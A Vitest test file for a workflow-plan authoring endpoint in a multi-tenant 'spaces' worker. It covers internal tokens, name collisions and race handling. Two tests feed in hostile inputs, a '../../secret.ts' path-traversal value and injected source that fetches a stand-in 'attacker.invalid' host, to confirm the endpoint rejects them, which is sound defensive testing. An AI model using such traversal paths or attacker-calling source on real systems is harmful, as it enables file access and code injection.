import { describe, expect, it, vi } from "vitest";
import { mintInternalToken } from "@naelao/http";
import spacesWorker from "./index.js";

describe("declarative workflow plan authoring endpoint", () => {
  it("compiles source through Agents before saving only under the project workflows directory", async () => {
    const secret = "workflow-plan-authoring-test-secret";
    const put = vi.fn(async () => ({ key: "saved" }));
    const agentFetch = vi.fn(async (request: Request) => {
      expect(request.headers.get("x-naelao-internal-token")).toBeTruthy();
      const path = new URL(request.url).pathname;
      if (path === "/internal/workflow-extensions/compile") return Response.json({ valid: true, digest: "a".repeat(64), bytes: 256 });
      expect(path).toBe("/internal/workspaces/legacy-write");
      return Response.json({ written: true, revision: 1 });
    });
    const spaceStub = { fetch: vi.fn(async () => Response.json({ id: "project-a" })) };
    const env = {
      ENVIRONMENT: "test", PLATFORM_SECRET: secret,
      PLATFORM_DB: { prepare: () => ({ bind: () => ({ first: async () => ({ found: 1 }) }) }) },
      SPACE_DO: { idFromName: (name: string) => name as never, get: () => spaceStub },
      AGENTS_WORKER: { fetch: agentFetch }, SCRIPTS_R2: { head: async () => null, put },
    } as never;
    const response = await spacesWorker.fetch(new Request("https://spaces.test/spaces/space-a/projects/project-a/workflows/plan", {
      method: "POST", headers: { "content-type": "application/json", "x-naelao-tenant-id": "tenant-a", "x-naelao-user-id": "owner-a", "x-naelao-role": "owner",
        "x-naelao-internal-token": await mintInternalToken(secret, "tenant-a") },
      body: JSON.stringify({ path: "workflows/daily-summary.ts", plan: { schemaVersion: "1.0", steps: [{ id: "read", operation: "tools.read", args: { query: "today" } }] } }),
    }), env);
    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({ saved: true, path: "workflows/daily-summary.ts", digest: "a".repeat(64), bytes: 256 });
    expect(agentFetch).toHaveBeenCalledTimes(2);
    const compiledRequest = agentFetch.mock.calls[0]?.[0] as Request;
    expect(await compiledRequest.clone().text()).toContain("tools.read");
    const legacyRequest = agentFetch.mock.calls[1]?.[0] as Request;
    expect(new URL(legacyRequest.url).pathname).toBe("/internal/workspaces/legacy-write");
    expect(await legacyRequest.clone().text()).toContain('"contentType":"text/typescript; charset=utf-8"');
    expect(put).not.toHaveBeenCalled();
  });

  it("rejects arbitrary paths and does not compile or write them", async () => {
    const secret = "workflow-plan-authoring-test-secret", put = vi.fn(), agentFetch = vi.fn();
    const env = { ENVIRONMENT: "test", PLATFORM_SECRET: secret,
      PLATFORM_DB: { prepare: () => ({ bind: () => ({ first: async () => ({ found: 1 }) }) }) },
      SPACE_DO: { idFromName: (name: string) => name as never, get: () => ({ fetch: async () => Response.json({ id: "p" }) }) },
      AGENTS_WORKER: { fetch: agentFetch }, SCRIPTS_R2: { head: async () => null, put },
    } as never;
    const response = await spacesWorker.fetch(new Request("https://spaces.test/spaces/s/projects/p/workflows/plan", { method: "POST",
      headers: { "content-type": "application/json", "x-naelao-tenant-id": "tenant-a", "x-naelao-user-id": "owner", "x-naelao-role": "admin", "x-naelao-internal-token": await mintInternalToken(secret, "tenant-a") },
      body: JSON.stringify({ path: "../../secret.ts", plan: { schemaVersion: "1.0", steps: [{ id: "read", operation: "tools.read", args: {} }] } }) }), env);
    expect(response.status).toBe(400);
    expect(agentFetch).not.toHaveBeenCalled();
    expect(put).not.toHaveBeenCalled();
  });

  it("preserves an existing draft and avoids compilation on name collision", async () => {
    const secret = "workflow-plan-authoring-test-secret", put = vi.fn(), agentFetch = vi.fn();
    const env = { ENVIRONMENT: "test", PLATFORM_SECRET: secret,
      PLATFORM_DB: { prepare: () => ({ bind: () => ({ first: async () => ({ found: 1 }) }) }) },
      SPACE_DO: { idFromName: (name: string) => name as never, get: () => ({ fetch: async () => Response.json({ id: "p" }) }) },
      AGENTS_WORKER: { fetch: agentFetch }, SCRIPTS_R2: { head: async () => ({ key: "existing" }), put },
    } as never;
    const response = await spacesWorker.fetch(new Request("https://spaces.test/spaces/s/projects/p/workflows/plan", { method: "POST",
      headers: { "content-type": "application/json", "x-naelao-tenant-id": "tenant-a", "x-naelao-user-id": "owner", "x-naelao-role": "admin", "x-naelao-internal-token": await mintInternalToken(secret, "tenant-a") },
      body: JSON.stringify({ path: "workflows/existing.ts", plan: { schemaVersion: "1.0", steps: [{ id: "read", operation: "tools.read", args: {} }] } }) }), env);
    expect(response.status).toBe(409);
    expect(agentFetch).not.toHaveBeenCalled();
    expect(put).not.toHaveBeenCalled();
  });

  it("uses an atomic create condition if another request wins the name race", async () => {
    const secret = "workflow-plan-authoring-test-secret", agentFetch = vi.fn(async (request: Request) =>
      new URL(request.url).pathname === "/internal/workspaces/legacy-write"
        ? Response.json({ error_code: "workspace_path_exists" }, { status: 409 })
        : Response.json({ valid: true, digest: "b".repeat(64), bytes: 10 }));
    const put = vi.fn(async () => null);
    const env = { ENVIRONMENT: "test", PLATFORM_SECRET: secret,
      PLATFORM_DB: { prepare: () => ({ bind: () => ({ first: async () => ({ found: 1 }) }) }) },
      SPACE_DO: { idFromName: (name: string) => name as never, get: () => ({ fetch: async () => Response.json({ id: "p" }) }) },
      AGENTS_WORKER: { fetch: agentFetch }, SCRIPTS_R2: { head: async () => null, put },
    } as never;
    const response = await spacesWorker.fetch(new Request("https://spaces.test/spaces/s/projects/p/workflows/plan", { method: "POST",
      headers: { "content-type": "application/json", "x-naelao-tenant-id": "tenant-a", "x-naelao-user-id": "owner", "x-naelao-role": "admin", "x-naelao-internal-token": await mintInternalToken(secret, "tenant-a") },
      body: JSON.stringify({ path: "workflows/raced.ts", plan: { schemaVersion: "1.0", steps: [{ id: "read", operation: "tools.read", args: {} }] } }) }), env);
    expect(response.status).toBe(409);
    expect(agentFetch).toHaveBeenCalledTimes(2);
    expect(put).not.toHaveBeenCalled();
  });

  it("rejects malformed plans without accepting caller-provided executable source", async () => {
    const secret = "workflow-plan-authoring-test-secret", put = vi.fn(), agentFetch = vi.fn();
    const env = { ENVIRONMENT: "test", PLATFORM_SECRET: secret,
      PLATFORM_DB: { prepare: () => ({ bind: () => ({ first: async () => ({ found: 1 }) }) }) },
      SPACE_DO: { idFromName: (name: string) => name as never, get: () => ({ fetch: async () => Response.json({ id: "p" }) }) },
      AGENTS_WORKER: { fetch: agentFetch }, SCRIPTS_R2: { head: async () => null, put },
    } as never;
    const response = await spacesWorker.fetch(new Request("https://spaces.test/spaces/s/projects/p/workflows/plan", { method: "POST",
      headers: { "content-type": "application/json", "x-naelao-tenant-id": "tenant-a", "x-naelao-user-id": "owner", "x-naelao-role": "admin", "x-naelao-internal-token": await mintInternalToken(secret, "tenant-a") },
      body: JSON.stringify({ path: "workflows/custom.ts", source: "export default async () => fetch('https://attacker.invalid')" }) }), env);
    expect(response.status).toBe(400);
    expect(agentFetch).not.toHaveBeenCalled();
    expect(put).not.toHaveBeenCalled();
  });
});
